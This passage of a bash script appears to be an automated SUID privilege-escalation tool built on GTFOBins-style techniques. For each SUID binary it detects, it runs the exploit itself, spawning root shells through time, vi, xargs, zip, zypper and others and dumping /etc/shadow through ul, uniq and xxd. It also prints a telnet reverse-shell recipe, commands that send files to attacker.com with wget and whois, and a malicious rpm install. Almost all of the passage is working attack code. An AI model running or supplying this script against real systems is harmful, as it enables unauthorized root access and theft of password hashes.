printf "TF=$(mktemp -u)\n"
printf "mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF\n"
printf "============================================\n" 
fi



 if [[ $suid == *'/usr/bin/tftp'* ]]; then
printf "============================================\n"
printf "tftp found\n"
printf "You can send a malicious file\n"
printf "sh -c 'cp $(which tftp) .; chmod +s ./tftp'\n"
printf "RHOST=x.x.x.x\n"
printf "./tftp $RHOST\n"
printf "put evil_file\n"
printf "============================================\n" 
fi

 if [[ $suid == *'time'* ]]; then
printf "============================================\n"
printf "time found\n"
printf "trying to get a shell:\n"
x=$(which time ); $x /bin/sh -p
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/timeout'* ]]; then
printf "============================================\n"
printf "timeout found\n"
printf "trying to get a shell:\n"
x=$(which timeout ); $x 7d /bin/sh -p
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/ul'* ]]; then
printf "============================================\n"
printf "ul found\n"
printf "trying to read /etc/shadow\n"
x=$(which ul ); $x /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/unexpand'* ]]; then
printf "============================================\n"
printf "unexpand found\n"
printf "trying to read /etc/shadow\n"
x=$(which unexpand ); $x -t99999999 /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/uniq'* ]]; then
printf "============================================\n"
printf "uniq found\n"
printf "trying to read /etc/shadow\n"
x=$(which uniq ); $x /etc/shadow
printf "============================================\n" 
fi

 if [[ $suid == *'unshare'* ]]; then
printf "============================================\n"
printf "unshare found\n"
printf "trying to get a shell:\n"
x=$(which unshare ); $x -r /bin/sh 
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/vi'* ]]; then
printf "============================================\n"
printf "vi found\n"
printf "trying to get a shell:"
x=$(which vi ); $x -c ':!/bin/sh' /dev/null
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/vim'* ]]; then
printf "============================================\n"
printf "vim found\n"
printf "trying to get a shell:"
x=$(which vim ); $x -c -c ':!/bin/sh' /dev/null
printf "============================================\n" 
fi

 if [[ $suid == *'watch'* ]]; then
printf "============================================\n"
printf "watch found\n"
printf "trying to get a shell:"
x=$(which watch ); $x -x sh -c 'reset; exec sh 1>&0 2>&0'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/wget'* ]]; then
printf "============================================\n"
printf "wget found\n"
printf "we can upload files\n"
printf "export URL=http://attacker.com/\n"
printf " LFILE=file_to_send\n"
printf "wget --post-file=$LFILE $URL\n"
printf "============================================\n" 
fi


 if [[ $suid == *'/usr/bin/whois'* ]]; then
printf "============================================\n"
printf "whois found\n"
printf "we can up-/download files:\n"
printf "\n"
printf "upload: nc -l -p 12345 > 'file_to_save'"
printf "try this:\n"
printf "RHOST=attacker.com\n"
printf "RPORT=12345\n"
printf "LFILE=file_to_send\n"
printf 'whois -h $RHOST -p $RPORT "`cat $LFILE`"\n'
printf "\n"
printf "download: nc -l -p 12345 < 'file_to_send' \n"
printf "RHOST=attacker.com\n"
printf "RPORT=12345 \n"
printf "LFILE=file_to_save\n"
printf 'whois -h $RHOST -p $RPORT > "$LFILE"\n'
printf "============================================\n" 
fi

 if [[ $suid == *'/usr/bin/wish'* ]]; then
printf "============================================\n"
printf "wish found\n"
printf "trying to get a shell:\n"
printf "enter: 'exec /bin/sh <@stdin >@stdout 2>@stderr'\n"
x=$(which wish ); $x ;
printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/xargs'* ]]; then
printf "============================================\n"
printf "xargs found\n"
printf "trying to get a shell:"
x=$(which xargs ); $x -a /dev/null sh
 printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/xxd'* ]]; then
printf "============================================\n"
printf "xxd found\n"
printf "trying to read /etc/shadow:"
x=$(which xxd ); $x /etc/shadow | $x -r
 printf "============================================\n"
fi

 if [[ $suid == *'yum'* ]]; then
 printf "============================================\n"
 printf "yum found\n"
 printf "try this:\n"
 printf "TF=$(mktemp -d)\n"
 printf "echo 'id' > $TF/x.sh\n"
 printf "fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n"
 printf "*on victimsbox*\n"
 printf "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"
 printf "references at: https://gtfobins.github.io/gtfobins/yum/\n "
 printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/zip'* ]]; then
 printf "============================================\n"
 printf "zip found\n"
 printf "trying to get a shell:\n"
x=$(mktemp -u);
y=$(which zip ); $y $x /etc/hosts -T -TT 'sh #' ; rm $x
 printf "============================================\n"
fi

 if [[ $suid == *'/usr/bin/zsh'* ]]; then
 printf "============================================\n"
 printf "zsh found\n"
 printf "trying to get a shell:\n"
 x=$(which zsh ); $x 
 printf "============================================\n"
fi



if [[ $suid == *'zypper'* ]]; then
 printf "============================================\n"
 printf "zypper found\n"
 printf "trying to get a shell:\n"
y=$(which cp ); $y /bin/sh /usr/lib/zypper/commands/zypper-x
x=$(which zypper ); $x x 
 printf "============================================\n"
 
fi
